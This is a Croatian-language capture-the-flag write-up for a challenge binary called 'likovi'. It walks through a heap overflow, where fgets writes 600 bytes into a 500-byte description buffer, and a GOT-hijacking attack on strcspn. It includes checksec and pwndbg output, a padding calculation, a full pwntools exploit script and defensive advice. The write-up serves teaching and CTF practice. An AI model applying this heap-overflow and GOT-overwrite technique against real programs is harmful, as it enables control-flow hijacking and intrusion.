# Writeup

## Otkrivanje ranjivosti



Detaljnom analizom izvornog koda programa, uočena je potencijalna ranjivost programa **heap overflow** kod uređivanja opisa postojećeg lika.

```c
printf("Novi opis (ostavi prazno za ostavljanje starog):\n");
char privOpis[500];
strcpy(privOpis, likovi[index]->opis);
fgets(likovi[index]->opis, 600, stdin);
likovi[index]->opis[strcspn(likovi[index]->opis, "\n")] = '\0';
if(strlen(likovi[index]->opis) == 0){
	strcpy(likovi[index]->opis, privOpis);	
}
```

U programu je za opis pojedinog lika rezervirano polje od 500 bajtova, a pomoću funkcije fgets se na rezervirano polje zapisuje maksimalno 600 bajta.

Pomoću programa ```checksec``` mogu se provjeriti zaštite kompajliranog programa.
```
└─$ checksec --file=likovi
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   56 Symbols        No    0               3               likovi
```
Iz rezultata postojećih zaštita se može vidjeti da kompajlirani program ne sadrži PIE zaštitu.


## Objašnjenje ranjivosti

Već je u prošlom zadatku objašnjen PIE pa se ovdje smatra da se razumije.

Kako bi se bolje razumjela ranjivost **heap overflow**, može se pogledati sadržaj heap-a u programu pomoću programa ```gdb``` u kombinaciji s ```pwndbg```. Za vizualni prikaz heap-a koristi se naredba ```vis```:


```
pwndbg> vis

...

0x405290        0x0000000000000000      0x0000000000000021      ........!.......
0x4052a0        0x00000000004052c0      0x0000000000405300      .R@......S@.....
0x4052b0        0x0000000000000000      0x0000000000000041      ........A.......
0x4052c0        0x0000006a6f726548      0x0000000000000000      Heroj...........
0x4052d0        0x0000000000000000      0x0000000000000000      ................
0x4052e0        0x0000000000000000      0x0000000000000000      ................
0x4052f0        0x0000000000000000      0x0000000000000201      ................
0x405300        0x69206e617a616e53      0x2072616261726820      Snazan i hrabar 
0x405310        0x002e6b696e746172      0x0000000000000000      ratnik..........
0x405320        0x0000000000000000      0x0000000000000000      ................

...

0x4054f0        0x0000000000000000      0x0000000000000021      ........!.......
0x405500        0x0000000000405520      0x0000000000405560       U@.....`U@.....
0x405510        0x0000000000000000      0x0000000000000041      ........A.......
0x405520        0x6361766f6b696c5a      0x0000000000000000      Zlikovac........
0x405530        0x0000000000000000      0x0000000000000000      ................
0x405540        0x0000000000000000      0x0000000000000000      ................
0x405550        0x0000000000000000      0x0000000000000201      ................
0x405560        0x696c6b756d646f50      0x76616b756c206920      Podmukli i lukav
0x405570        0x6e626f7261632069      0x000000002e6b616a      i carobnjak.....
0x405580        0x0000000000000000      0x0000000000000000      ................
0x405590        0x0000000000000000      0x0000000000000000      ................

...
```


Ovdje se može vidjeti kako se na heap-u nalaze podaci o dva lika: Heroj i Zlikovac.
Njihovi chunck-ovi započinju sa ```0x0000000000000021```. Nakon toga slijede dvije adrese koje također pokazuju na heap. Zo su adresa sadržaja imena lika i adresa sadržaja opisa lika.
Ispod tih adresa nalazi se stvarni sadržaj imena i opisa lika. Ime je veliko 50 bajtova, a opis 500 bajtova. 
Vidi se da se podaci za oba lika nalaze jedan pored drugog.
Budući da se na adresu opisa lika upisuje 600 bajtova (to je više nego rezervirana veličina), može se manipulirati sadržajem koji se nalazi izvan opisa lika. Ovdje je važno da nakon opisa prvog lika slijedi chunk za drugog lika.

 
Ovdje se može iskoristiti napad ```GOT hijacking``` kako bi se preusmjerilo izvršavanje programa na funkciju ```ispisiTajnuPoruku```.
GOT (Global Offset Table) je tablica u memoriji koja pohranjuje adrese vanjskih funkcija i varijabli koje se dinamički povezuju tijekom izvršavanja programa.
Ideja je da se uredi jedan zapis funkcije koja se poziva pomoću GOT tablice tako da pokazuje na funkciju ```ispisiTajnuPoruku```. Prva vanjska funkcija koja se poziva je ```strcspn```.

Situacija u kojoj se može iskoristiti napad je sljedeća:
 - Prvo se uređuje opis prvog lika (Heroj) na način da se u njega upiše: padding do drugog chunka + informacije o chunku (ostaju iste) + adresa funkcije ```strcspn``` iz GOT tablice
 - Zatim se uređuje ime drugog lika (Zlikovac) na način da se u njega upiše adresa funkcije ```ispisiTajnuPoruku```.
 - programski poziv funkcije ```strcspn``` uzrokuje poziv funkcije ```ispisiTajnuPoruku```



Kako bi se izračunao potreban padding, treba se pogledati adresa na kojoj započinje opis prvog lika. 
```
0x405300        0x69206e617a616e53      0x2072616261726820      Snazan i hrabar 
```
Ona je ```0x405300```.


Zatim se treba odrediti na kojoj adresi započinje chunk drugog lika. 
```
0x4054f0        0x0000000000000000      0x0000000000000021      ........!.......
```
Ona je ```0x4054f8```.

Izračun paddinga:

```
0x4054f0 - 0x405300 = 1F0 = 496 (dec)
496 + 8 = 504
```

Potreban padding je 504 bajta.





## Iskorištenje ranjivosti


Za izradu rješenja može se napraviti Python skripta koja iskorištava heap overflow ranjivost u zadatku. 
Koraci programa:
 - Odabire se opcija za uređivanja likova (4)
 - Odabire se prvi lik (1)
 - Unosi se novi opis lika koji uređuje sadržaj podataka drugog lika i s time omogućuje uređivanje GOT tablice
 - Ponovi se odabir opcije uređivanja likova (4)
 - Odabire se drugi lik (2)
 - Unosi se novi naziv lika koji je adresa funkcije ```ispisiTajnuPoruku```.


```python
from pwn import *

io = process("./likovi")
elf = ELF("./likovi")

# = = = START

# Part1

print(io.recvuntil(b"Odabir:"))
io.sendline(b"4")

print(io.recvuntil(b"Koji lik zelite urediti?:"))
io.sendline(b"1")

print(io.recvuntil(b"Novo ime (ostavi prazno za ostavljanje starog):"))
io.sendline(b"")

print(io.recvuntil(b"Novi opis (ostavi prazno za ostavljanje starog):"))


payload = b""

padding = b"A" * 504

chunk_info = p64(0x21)


strcspn = p64(elf.got["strcspn"])
print(f"Adresa strcspn = {elf.got["strcspn"]:#x}")

payload += padding + chunk_info + strcspn

io.sendline(payload)
print(payload)

# Part2

print(io.recvuntil(b"Odabir:"))
io.sendline(b"4")


print(io.recvuntil(b"Koji lik zelite urediti?:"))
io.sendline(b"2")


print(io.recvuntil(b"Novo ime (ostavi prazno za ostavljanje starog):"))


payload2 = b""

ispisiTajnuPoruku = p64(elf.sym["ispisiTajnuPoruku"])

payload2 += ispisiTajnuPoruku


io.sendline(payload2)
print(payload2)


# = = = END


io.interactive()

```

Pokretanjem ove skripte, ispiše se flag ```CTFFOI[H3AP_c0ntr0l1ng_G0T]```

## Edukativne smjernice
- Heap overflow je napad kod kojeg se unos veći od rezerviranog memorijskog prostora na heapu (buffera) upisuje izvan granica buffera i može prebrisati podatke u susjednim chunk-ovima.
- Za zaštitu od ove ranjivosti preporučuje se:
    - Provjeriti i ograničiti duljinu korisničkog unosa
    - Koristiti sigurnije funkcije za kopiranje niza: ```strncpy``` i ```memcpy_s```. One imaju točno definirane veličine za kopiranje.
    - Uključiti heap canary zaštitu (gcc ... -fsanitize=address) kako bi se pri pisanju izvan granica buffera detektiralo prepisivanje i odmah zaustavilo izvođenje programa.
    - Aktivirati ASLR/PIE kako bi adrese na heap-u bile nasumične i teže predvidljive.
